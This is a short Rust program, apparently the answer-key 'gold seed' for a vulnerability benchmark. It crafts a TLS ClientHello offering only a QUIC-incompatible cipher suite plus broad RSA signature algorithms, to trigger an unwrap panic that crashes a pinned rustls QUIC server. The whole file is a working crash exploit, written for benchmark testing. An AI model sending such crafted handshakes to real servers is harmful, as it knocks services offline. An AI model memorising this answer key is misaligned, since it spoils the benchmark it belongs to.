// Gold-seed generator for the rustls benchmark target (oracle — never shipped).
// Emits to stdout the crafted ClientHello handshake message (type|len24|body)
// that panics the pinned QUIC server: it offers ONLY the wire ID of the
// quic:None suite, with a wide signature_algorithms set so the server's real
// RSA credential resolves (reaching the suite->key_schedule unwrap).
//
// Usage: cargo run -q > gold.bin && /work/riptarget gold.bin   # exit 101
use rustls::crypto::{CipherSuite, SignatureScheme};
use rustls::enums::ProtocolVersion;
use rustls_test::encoding;
use std::io::Write;

fn main() {
    let wide_sig_algs = encoding::Extension {
        typ: encoding::Extension::SIGNATURE_ALGORITHMS,
        body: encoding::len_u16(encoding::vector_of(
            [
                SignatureScheme::RSA_PSS_SHA512,
                SignatureScheme::RSA_PSS_SHA384,
                SignatureScheme::RSA_PSS_SHA256,
                SignatureScheme::RSA_PKCS1_SHA512,
                SignatureScheme::RSA_PKCS1_SHA384,
                SignatureScheme::RSA_PKCS1_SHA256,
                SignatureScheme::ECDSA_NISTP256_SHA256,
            ]
            .map(|s| s.to_array()),
        )),
    };
    let hello = encoding::client_hello(
        ProtocolVersion::TLSv1_2,
        &[0u8; 32],
        &[0],
        vec![CipherSuite::TLS13_CHACHA20_POLY1305_SHA256],
        vec![
            encoding::Extension::new_kx_groups(),
            wide_sig_algs,
            encoding::Extension::new_versions(),
            encoding::Extension::new_dummy_key_share(),
            encoding::Extension::new_quic_transport_params(b"client params"),
        ],
    );
    std::io::stdout().write_all(&hello).unwrap();
}
